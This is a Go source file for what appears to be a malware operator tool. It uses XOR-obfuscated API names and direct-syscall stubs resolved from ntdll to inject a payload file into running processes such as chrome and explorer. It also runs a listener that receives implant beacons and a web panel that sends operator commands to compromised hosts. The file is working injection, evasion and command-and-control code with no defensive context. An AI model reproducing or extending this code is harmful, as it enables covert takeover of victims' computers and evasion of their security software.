package main

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
)

// OBLITERATUS QUANTUM - STABLE CORE

func EnergyFlow(a1 uintptr, id uint32, ep uintptr, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uint32

func d(b []byte) string {
	for i := range b { b[i] ^= 0x3F }
	return string(b)
}

var (
	kL = syscall.MustLoadDLL(d([]byte{0x54, 0x5A, 0x4D, 0x51, 0x5A, 0x53, 0x0C, 0x0D, 0x11, 0x5B, 0x53, 0x53}))
	pOp = kL.MustFindProc(d([]byte{0x70, 0x4F, 0x5A, 0x51, 0x6F, 0x4D, 0x50, 0x5C, 0x5A, 0x4C, 0x4C}))
	pCl = kL.MustFindProc(d([]byte{0x7C, 0x53, 0x50, 0x4C, 0x5A, 0x77, 0x5E, 0x51, 0x5B, 0x53, 0x5A}))
	cCn net.Conn
)

type SPr struct { ID uint32; AD uintptr }

func res(n string) SPr {
	nt := syscall.MustLoadDLL(d([]byte{0x51, 0x4B, 0x5B, 0x53, 0x53, 0x11, 0x5B, 0x53, 0x53}))
	p := nt.MustFindProc(n); a := p.Addr()
	if id, ad := sc(a); ad != 0 { return SPr{id, ad} }
	for i := 1; i < 32; i++ {
		if id, ad := sc(a - uintptr(i*32)); ad != 0 { return SPr{id + uint32(i), ad} }
		if id, ad := sc(a + uintptr(i*32)); ad != 0 { return SPr{id - uint32(i), ad} }
	}
	return SPr{0, 0}
}

func sc(a uintptr) (uint32, uintptr) {
	b := *(*[32]byte)(unsafe.Pointer(a))
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		id := *(*uint32)(unsafe.Pointer(a + 4))
		for i := 0; i < 32; i++ { if b[i] == 0x0F && b[i+1] == 0x05 { return id, a + uintptr(i) } }
	}
	return 0, 0
}

var (
	u = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	clients = make(map[*websocket.Conn]bool)
	mut sync.Mutex
)

func logS(s, level string) {
	msg := map[string]string{"timestamp": time.Now().Format("15:04:05"), "level": level, "message": s}
	mut.Lock(); defer mut.Unlock()
	for c := range clients { c.WriteJSON(msg) }
}

func flow(pid int, raw []byte) int {
	h, _, _ := pOp.Call(0x1F0FFF, 0, uintptr(pid))
	if h == 0 { return -1 }
	defer pCl.Call(h)
	aH := res(d([]byte{0x71, 0x4B, 0x7E, 0x53, 0x53, 0x50, 0x5C, 0x5E, 0x4B, 0x5A, 0x69, 0x56, 0x4D, 0x4B, 0x4A, 0x5E, 0x53, 0x72, 0x5A, 0x52, 0x50, 0x4D, 0x46}))
	var ba uintptr; sz := uintptr(len(raw))
	EnergyFlow(h, aH.ID, aH.AD, uintptr(unsafe.Pointer(&ba)), 0, uintptr(unsafe.Pointer(&sz)), 0x3000, 0x04, 0, 0, 0, 0, 0)
	wH := res(d([]byte{0x71, 0x4B, 0x68, 0x4D, 0x56, 0x4B, 0x5A, 0x69, 0x56, 0x4D, 0x4B, 0x4A, 0x5E, 0x53, 0x72, 0x5A, 0x52, 0x50, 0x4D, 0x46}))
	for i := 0; i < len(raw); i += 256 {
		ln := 256; if i+256 > len(raw) { ln = len(raw) - i }
		var nw uintptr
		EnergyFlow(h, wH.ID, wH.AD, ba+uintptr(i), uintptr(unsafe.Pointer(&raw[i])), uintptr(ln), uintptr(unsafe.Pointer(&nw)), 0, 0, 0, 0, 0, 0)
	}
	pH := res(d([]byte{0x71, 0x4B, 0x6F, 0x4D, 0x50, 0x4B, 0x5A, 0x5C, 0x4B, 0x69, 0x56, 0x4D, 0x4B, 0x4A, 0x5E, 0x53, 0x72, 0x5A, 0x52, 0x50, 0x4D, 0x46}))
	var opv uint32
	EnergyFlow(h, pH.ID, pH.AD, uintptr(unsafe.Pointer(&ba)), uintptr(unsafe.Pointer(&sz)), 0x20, uintptr(unsafe.Pointer(&opv)), 0, 0, 0, 0, 0, 0)
	eH := res(d([]byte{0x71, 0x4B, 0x7C, 0x4D, 0x5A, 0x5E, 0x4B, 0x5A, 0x6B, 0x57, 0x4D, 0x5A, 0x5E, 0x5B, 0x7A, 0x47}))
	var ht uintptr
	EnergyFlow(uintptr(unsafe.Pointer(&ht)), eH.ID, eH.AD, 0x1FFFFF, 0, h, ba, 0, 0, 0, 0, 0, 0)
	if ht == 0 { return -4 }
	defer pCl.Call(ht)
	return 0
}

func main() {
	go func() {
		l, _ := net.Listen("tcp", "0.0.0.0:9999")
		for {
			c, _ := l.Accept(); cCn = c
			logS("UPLINK ACTIVE.", "SUCCESS")
			go func() {
				b := make([]byte, 4096)
				for {
					n, err := c.Read(b); if err != nil { break }
					msg := map[string]string{"action": "beacon_data", "output": string(b[:n])}
					mut.Lock(); for cl := range clients { cl.WriteJSON(msg) }; mut.Unlock()
				}
				cCn = nil
			}()
		}
	}()
	
	http.HandleFunc("/sync", func(w http.ResponseWriter, r *http.Request) {
		var data map[string]string; json.NewDecoder(r.Body).Decode(&data)
		p, _ := strconv.Atoi(data["pid"]); s, _ := os.ReadFile("payloads/research_signal.bin")
		if flow(p, s) == 0 { logS("SYNC SUCCESSFUL.", "SUCCESS"); w.Write([]byte("OK")) } else { w.WriteHeader(500) }
	})

	http.HandleFunc("/processes", func(w http.ResponseWriter, r *http.Request) {
		cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
		o, _ := cmd.Output(); rd := csv.NewReader(strings.NewReader(string(o))); rs, _ := rd.ReadAll()
		var ps []map[string]interface{}
		for _, rc := range rs { if len(rc) >= 2 { p, _ := strconv.Atoi(rc[1]); ps = append(ps, map[string]interface{}{"pid": p, "name": rc[0]}) } }
		w.Header().Set("Content-Type", "application/json"); json.NewEncoder(w).Encode(ps)
	})

	http.HandleFunc("/intelligence", func(w http.ResponseWriter, r *http.Request) {
		cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
		o, _ := cmd.Output(); rd := csv.NewReader(strings.NewReader(string(o))); rs, _ := rd.ReadAll()
		var ts []map[string]interface{}
		for _, rc := range rs {
			if len(rc) >= 2 {
				n := strings.ToLower(rc[0])
				if strings.Contains(n, "notepad") || strings.Contains(n, "chrome") || strings.Contains(n, "explorer") {
					p, _ := strconv.Atoi(rc[1]); ts = append(ts, map[string]interface{}{"pid": p})
				}
			}
		}
		w.Header().Set("Content-Type", "application/json"); json.NewEncoder(w).Encode(ts)
	})

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		c, _ := u.Upgrade(w, r, nil); mut.Lock(); clients[c] = true; mut.Unlock()
		for {
			var msg map[string]string; if err := c.ReadJSON(&msg); err != nil { break }
			if msg["action"] == "load" { p, _ := strconv.Atoi(msg["pid"]); s, _ := os.ReadFile("payloads/research_signal.bin"); flow(p, s) }
			if msg["action"] == "command" && cCn != nil { cCn.Write([]byte(msg["command"] + "\n")) }
		}
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { http.ServeFile(w, r, "src/web/index.html") })
	fmt.Println("[+] Quantum Stable Manager: http://localhost:8080")
	http.ListenAndServe(":8080", nil)
}
